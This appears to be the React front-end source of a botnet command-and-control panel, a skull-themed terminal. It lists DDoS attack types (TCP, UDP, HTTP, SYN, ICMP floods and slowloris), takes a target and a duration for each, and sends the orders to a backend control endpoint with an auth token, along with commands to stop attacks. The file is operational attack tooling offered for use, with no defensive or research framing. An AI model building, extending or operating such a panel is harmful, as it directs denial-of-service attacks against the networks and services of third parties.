import React, { useState, useEffect, useRef } from 'react';
import './BotnetTerminal.css';
import Cookies from 'js-cookie';
import { useAuthStore } from '../../hooks';
import { ToastContainer, toast } from 'react-toastify';
import { FaSkull } from "react-icons/fa6";

export const BotnetTerminal = () => {
  const [input, setInput] = useState('');
  const [visibleHistory, setVisibleHistory] = useState([]);
  const [fullHistory, setFullHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(null);
  const inputRef = useRef(null);
  
  
  const {startLogOut} = useAuthStore()
  
  const containerRef = useRef(null);
  useEffect(() => {
    const container = containerRef.current;
    if (container) {
      container.scrollTop = container.scrollHeight;
    }
  }, [input]);

  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.ctrlKey && e.key.toLowerCase() === 'l') {
        e.preventDefault();
        setVisibleHistory([]);
        return;
      }

      if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (fullHistory.length === 0) return;

        const newIndex = historyIndex === null
          ? fullHistory.length - 1
          : Math.max(0, historyIndex - 1);

        setInput(fullHistory[newIndex]?.command || '');
        setHistoryIndex(newIndex);
      }

      if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (fullHistory.length === 0) return;

        const newIndex = historyIndex === null
          ? 0
          : Math.min(fullHistory.length - 1, historyIndex + 1);

        setInput(fullHistory[newIndex]?.command || '');
        setHistoryIndex(newIndex);
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [historyIndex, fullHistory]);

  const handleClick = () => inputRef.current?.focus();

  const customCommand = async (command) => {

    let response=""
    const array_cmd = command.split(" ")
    
    let body={};
    switch(array_cmd.length){
      case 1:
        if(array_cmd[0] != 'stop_attack') return;
        response = "Attacks stopped"
        body=JSON.stringify({stop_attack:''}) 
        break;

      case 2:
        if(array_cmd[0] != 'stop_attack') return;
        response = "Attacks stopped"
        body=JSON.stringify({stop_attack:array_cmd[1]}) 
        break;

      case 3:
        const [ type, target, duration] = array_cmd;
        const attack={
          type,
          target,
          duration
        };
        
        response = `Attack ${type} has been started, target [ ${target} ]`

        body=JSON.stringify({attack}) 
        break;

    }

    try {
      const requests = await fetch(`${import.meta.env.VITE_API_URL}/api/rcv/cpanel/all`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-token':`${Cookies.get('x-token')}`},
        body: body
      });

      if (!requests.ok) throw new Error(`Server error ${requests.status}`);
      
      const data = await requests.json();

      if (data.msg === "Invalid auth") {
        toast.error("Invalid auth");
        startLogOut();
      }
      return response;

    } catch (error) {
      //console.error('Error en customCommand:', error);
      return 'Hubo un error ejecutando el comando.' ;
    }
  };

  const executeCommand = async (command) => {
    if (!command.trim()) return;

    let response = '';

    switch (command) {
      case 'help':
        response = 'Available commands: help, about, clear, history, attacks';
        break;
      case 'about':
        response = 'Botnet';
        break;
      case 'clear':
        setVisibleHistory([]);
        setInput('');
        return;
      case 'history':
        response = fullHistory.map((h, i) => `${i + 1}: ${h.command}`).join('\n');
        break;

      case 'attacks':

        response = `
          _______________________________________________________________
          |__Arg 1__|_____________|______Arg2____|____________|___Arg3__|
        
          tcp_flood              <target_ip:port>           <duration>         (NO http/https)
          udp_flood              <target_ip:port>           <duration>         (NO http/https)
          http_flood             <http://host:port>         <duration>
          slowloris              <target_ip:port>           <duration>         (NO http/https)
          syn_flood              <target_ip:port>           <duration>         (NO http/https)
          icmp_flood             <target_ip:port>           <duration>         (NO http/https)

           _______________Stop attacks____________
          |__Arg 1__|_____________|______Arg2____|
        
          stop_attack                                    (Stop all attacks)
          stop_attack               <attack_type>        (Stop specific attack)

          
        `;
        break;
        
      default: {
        const data = await customCommand(command);
        response = data;
        break;
        //response = data.result;
        //break;
      }
    }

    const newEntry = { command, response };
    setFullHistory([...fullHistory, newEntry]);
    setVisibleHistory([...visibleHistory, newEntry]);
    setInput('');
    setHistoryIndex(null);
    inputRef.current?.focus();
  };

  const handleCommand = async (e) => {
    e.preventDefault();
    await executeCommand(input);
  };



  return (
    <div className="botnet-terminal-container" onClick={handleClick}>
      <div className="botnet-terminal-header">
        <span className="botnet-terminal-dot red" > <FaSkull className='botnet-terminal-dot-icon'/> </span>
        <span className="botnet-terminal-dot yellow" > <FaSkull className='botnet-terminal-dot-icon'/> </span>
        <span className="botnet-terminal-dot green" > <FaSkull className='botnet-terminal-dot-icon'/> </span>
        Type &gt; help
      </div>
      <div className="botnet-terminal-body" ref={containerRef}>
        {
        visibleHistory.length > 0 &&
        visibleHistory.map((entry, idx) => (
          <div key={idx}>
            <div className="botnet-terminal-line">
              <span className="botnet-prompt">(Botnet ☠) &gt;</span>
              <span>{entry.command}</span>
            </div>
            <div className="botnet-terminal-response">{entry.response}</div>
          </div>
        ))
        }
        <form onSubmit={handleCommand}>
          <div className="botnet-terminal-line">
            <span className="botnet-prompt">(Botnet ☠) &gt;</span>
            <input
              type="text"
              ref={inputRef}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              autoFocus
              className="botnet-terminal-input"
            />
          </div>
        </form>
      </div>
      <ToastContainer
      position="top-center"
      autoClose={4000}
      hideProgressBar={true}
      newestOnTop={false}
      closeOnClick
      pauseOnFocusLoss
      draggable
      pauseOnHover
      theme="dark"
      />
    </div>
  );
};
